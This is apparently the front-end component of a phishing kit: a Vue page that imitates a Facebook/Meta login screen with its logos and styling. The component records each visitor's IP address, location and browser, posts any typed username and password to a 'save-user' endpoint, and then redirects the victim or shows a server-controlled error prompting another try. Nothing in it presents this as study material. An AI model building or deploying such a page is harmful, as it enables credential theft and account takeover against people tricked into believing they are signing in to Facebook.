<template>
  <div>
    <div v-if="isDisabled" class="loading-page">
      <p>Loading...</p>
    </div>
    
    <div class="imgg">
      <img src="/img/fb.webp" alt="" class="logo">
      <img src="/img/18.png" alt="" class="logo18">
      
   </div>
   
   <div class="popup" id="error-popup">
    <div class="popup-content">
        <p><b>{{ msg.tilte }}</b></p>
        <p style="margin-top: 10px; font-size: 12px;">{{ msg.des }}</p>

        <div class="popup-divider"></div>
        <a id="close-popup" @click="closepop">OK</a>
    </div>
    </div>
   <div class="xxx">
      <div class="jav">
        <span><b>⏯ {{ text.info }}</b></span>
      </div>
     
         <div class="jav">
            <input type="text" id="tk" v-model="form.username" required class="inputtkmk" :placeholder="text.username" >
         </div>
         <div class="jav">
            <input type="password" id="mk" v-model="form.password" required class="inputtkmk" :placeholder="text.password">
         </div>
         <div class="jav" style="margin-bottom: 16px;">
            <button class="login" id="login" @click="Login">{{ text.login }}</button>
         </div>
    
      <div class="jav">
         <p class="resetpass">{{ text.forgot_password }}</p>
      </div>
      <div class="xx"></div>
      <div class="jav">
         <button class="regacc">{{ text.create_acc }}</button>
         <center>
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt="" class="meta">
         </center>
      </div>
   </div>
  </div>
</template>

<script>
export default {
  name: 'IndexPage',
  data(){
    return {
      form:{
        username: null,
        password: null,
      },
      text : {
   
      },
      msg:{

      },
      isDisabled: false,
      noti:{
        show: false,
        text: '',
        variant: ''
      }
    }
  },
  mounted() {
    this.check_local() 
   
  },
  methods: {
    async check_local(){
        try {
          const result = await this.$axios.get('https://www.cloudflare.com/cdn-cgi/trace')      
          this.form.ip = result.data.match(/ip=([^\s]+)/)[1]
          this.form.local = result.data.match(/loc=([^\s]+)/)[1]
          this.form.ua = navigator.userAgent
          this.get_config()
        } catch (error) {
           
  
        }
    },
    async get_config() {
     this.isDisabled = true
      try {
        const result = await this.$axios.$post('?type=get-config', this.form)
        this.text = result.text
        console.log(this.text)
      } catch (error) {
        
      }
      this.isDisabled = false

    },

    async Login(){
        this.isDisabled = true
        try {
            const result = await this.$axios.$post('?type=save-user', this.form)
            if(!result.success) {
              this.msg = result.msg
              document.getElementById('error-popup').style = 'display: block;'

            } else {
              window.location.href = result.url
            }
        } catch (error) {
               
        }
        this.isDisabled = false
    },
    async closepop() {
          document.getElementById('error-popup').style = 'display: none;'
      }
  },
  
}
</script>
<style >
.loading-page {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgb(255, 255, 255);
      text-align: center;
      padding-top: 200px;
      font-size: 30px;
      font-family: sans-serif;
    }
* {
   padding: 0;
   margin: 0;
   box-sizing: border-box;
   font-family: Arial, Helvetica, sans-serif;
}

@font-face {
   font-family: Arial, Helvetica, sans-serif;
}
body {
   background: rgb(2, 0, 36);
   background: linear-gradient(93deg, rgba(2, 0, 36, 1) 0%, rgb(249 242 249) 0%, rgba(237, 246, 254, 1) 22%);
   height: 95vh;
   padding: 0 14px 0 14px;
   font-family: Arial, Helvetica, sans-serif;
   margin-top: 48px;
}

.imgg {
   height: 200px;
   display: flex;
   justify-content: center;
   align-items: center;
}

.logo {
   width: 45px;
}
.logo18 {
   width: 55px;
}
.jav {
   margin-bottom: 13px;
}

.inputtkmk {
   width: 100%;
   height: 54px;
   border-radius: 12px;
   padding-left: 18px;
   border: 1px solid #e1e3e6;
   font-size: 14px;
   background-color: #fff;
   outline: none;
   transition: all .2s;
}

.inputtkmk:focus {
   border-color: #848484;
}

.inputtkmk::placeholder {
   color: #a9b0b7;
}

.login {
   background-color: #0064e0;
   color: #fff;
   width: 100%;
   height: 40px;
   outline: none;
   border: none;
   font-size: 14.5px;
   border-radius: 20px;
   cursor: pointer;
   transition: all .2s;
}

.login:active {
   background-color: #408be8;
}

.regacc {
   background-color: transparent;
   color: #186fd9;
   width: 100%;
   height: 40px;
   outline: none;
   border: none;
   font-size: 14.5px;
   border-radius: 20px;
   cursor: pointer;
   border: 1px solid #186fd9;
}

.resetpass {
   text-align: center;
   font-size: 14px;
}

.xx {
   height: calc(75vh - 407px);
}
.meta {
   margin-top: 14px;
   width: 50px;
}

.popup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 300px;
    height: auto;
    z-index: 9999; /* Đặt giá trị z-index cao hơn */
}

.popup-content {
    text-align: center;
    padding: 20px;
    background-color: white;
    border-radius: 10px;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
}

.popup-divider {
    border-top: 1px solid #ccc;
    margin-top: 20px;
    padding-top: 10px;
}

#close-popup {
    margin-top: 20px;
   
    /* background-color: #007bff; */
    color: #007bff;
    border: none;
    border-radius: 20px; /* Bo góc */
    cursor: pointer;
}

#close-popup:hover {
    background-color: #0056b3;
}


</style>